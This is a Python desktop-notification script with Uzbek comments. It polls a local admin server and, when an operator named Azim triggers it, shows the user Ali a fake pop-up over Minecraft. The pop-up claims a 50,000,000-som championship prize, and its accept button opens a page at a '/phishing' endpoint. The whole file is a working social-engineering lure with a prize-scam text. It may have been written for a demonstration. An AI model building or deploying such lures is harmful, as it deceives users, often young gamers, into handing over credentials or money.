#!/usr/bin/env python3
"""
Ali uchun desktop notification daemon.
Azim admin paneldan signal kelganda Minecraft ustiga chiqadi.
"""
import tkinter as tk
import subprocess
import threading
import urllib.request
import datetime
import json
import time
import sys

API = 'http://localhost:8001'
BG    = '#1c1c1c'
GREEN = '#00c853'
W, H  = 380, 148


class NotifDaemon(tk.Tk):
    def __init__(self):
        super().__init__()
        self._alpha     = 0.0
        self._shown     = False
        self._dot_state = True
        self._setup_window()
        self._build_ui()
        self._blink_dot()
        self._start_polling()

    # ── Window setup ─────────────────────────────────────────────────────────

    def _setup_window(self):
        self.overrideredirect(True)          # titlebarsiz
        self.attributes('-topmost', True)    # har doim ustda
        self.attributes('-alpha', 0.0)       # boshlang'ich — ko'rinmas
        self.configure(bg=BG)
        self.resizable(False, False)

        # X11 hint: notification type (ba'zi WM lar uchun)
        try:
            self.attributes('-type', 'notification')
        except Exception:
            pass

        # Pozitsiya: o'ng pastki burchak
        sw = self.winfo_screenwidth()
        sh = self.winfo_screenheight()
        x  = sw - W - 18
        y  = sh - H - 55
        self.geometry(f'{W}x{H}+{x}+{y}')
        self.withdraw()

    # ── UI ───────────────────────────────────────────────────────────────────

    def _build_ui(self):
        # Yashil chiziq (chap)
        tk.Frame(self, width=3, bg=GREEN).pack(side='left', fill='y')

        body = tk.Frame(self, bg=BG, padx=14, pady=10)
        body.pack(side='left', fill='both', expand=True)

        # App satri
        top = tk.Frame(body, bg=BG)
        top.pack(fill='x', anchor='w')

        self._dot_canvas = tk.Canvas(top, width=8, height=8, bg=BG,
                                     highlightthickness=0)
        self._dot_oval   = self._dot_canvas.create_oval(1, 1, 7, 7,
                                                         fill=GREEN, outline='')
        self._dot_canvas.pack(side='left', padx=(0, 6))

        tk.Label(top, text='MINECRAFT CHAMPIONSHIP UZ 🇺🇿',
                 font=('Courier New', 7), fg='#505050', bg=BG).pack(side='left')

        self._time_lbl = tk.Label(top, text='',
                                   font=('Courier New', 7), fg='#404040', bg=BG)
        self._time_lbl.pack(side='right')

        # Sarlavha
        tk.Label(body,
                 text="🏆  TABRIKLAYMIZ!",
                 font=('Segoe UI', 11, 'bold'),
                 fg='#ffd700', bg=BG, anchor='w').pack(anchor='w', pady=(5, 0))

        # Matn
        tk.Label(body,
                 text="Siz \"MINECRAFT CHAMPIONSHIP UZ\"\n"
                      "musobaqasining G'OLIBI bo'ldingiz!\n"
                      "Yutuq: 50 000 000 so'm\n"
                      "Mukofotni olish uchun — bu yerga bosing.",
                 font=('Segoe UI', 8),
                 fg='#aaaaaa', bg=BG, anchor='w', justify='left').pack(anchor='w', pady=(3, 0))

        # Tugmalar
        btn_row = tk.Frame(body, bg=BG)
        btn_row.pack(anchor='w', pady=(9, 0))

        tk.Button(btn_row,
                  text='✅ Qabul qilish',
                  font=('Courier New', 8, 'bold'),
                  bg='#2e7d32', fg='#ffffff',
                  activebackground='#4caf50', activeforeground='#fff',
                  relief='raised', bd=2, padx=12, pady=3, cursor='hand2',
                  command=self._open_phishing).pack(side='left', padx=(0, 8))

        tk.Button(btn_row,
                  text="O'tkazib yuborish",
                  font=('Courier New', 8),
                  bg='#333333', fg='#aaaaaa',
                  activebackground='#444', activeforeground='#ccc',
                  relief='raised', bd=2, padx=8, pady=3, cursor='hand2',
                  command=self._dismiss).pack(side='left')

    # ── Animations ───────────────────────────────────────────────────────────

    def _blink_dot(self):
        color = GREEN if self._dot_state else '#1a3a22'
        self._dot_canvas.itemconfig(self._dot_oval, fill=color)
        self._dot_state = not self._dot_state
        self.after(900, self._blink_dot)

    def _fade_in(self):
        self._alpha = min(self._alpha + 0.09, 0.95)
        self.attributes('-alpha', self._alpha)
        if self._alpha < 0.95:
            self.after(14, self._fade_in)

    def _fade_out(self):
        self._alpha = max(self._alpha - 0.09, 0.0)
        self.attributes('-alpha', self._alpha)
        if self._alpha > 0:
            self.after(14, self._fade_out)
        else:
            self.withdraw()
            self._shown = False

    # ── Actions ──────────────────────────────────────────────────────────────

    def _show(self):
        self._time_lbl.config(
            text=datetime.datetime.now().strftime('%H:%M'))
        self._alpha = 0.0
        self.deiconify()
        self.lift()
        self.attributes('-topmost', True)
        self._shown = True
        self._fade_in()
        # 12 sekunddan keyin o'chadi
        self.after(12000, self._dismiss)

    def _dismiss(self):
        if self._shown:
            self._fade_out()

    def _open_phishing(self):
        subprocess.Popen(['xdg-open', f'{API}/phishing'],
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
        self._dismiss()

    # ── Polling ──────────────────────────────────────────────────────────────

    def _poll_loop(self):
        while True:
            try:
                with urllib.request.urlopen(
                    f'{API}/api/notification-status', timeout=2
                ) as r:
                    data = json.loads(r.read())

                if data.get('triggered') and not self._shown:
                    # ACK — qayta kelmasin
                    req = urllib.request.Request(
                        f'{API}/api/notification-ack', method='POST')
                    urllib.request.urlopen(req, timeout=2)
                    # Asosiy thread da ko'rsat
                    self.after(0, self._show)

            except Exception:
                pass
            time.sleep(1.5)

    def _start_polling(self):
        t = threading.Thread(target=self._poll_loop, daemon=True)
        t.start()


# ── Entry point ──────────────────────────────────────────────────────────────

if __name__ == '__main__':
    print(f'[✓] Notification daemon ishga tushdi')
    print(f'[*] Server: {API}')
    print('[*] Minecraft o\'ynang — Azim signal yuborganida notification chiqadi')
    print('[*] Ctrl+C bilan to\'xtatish mumkin\n')
    app = NotifDaemon()
    app.mainloop()
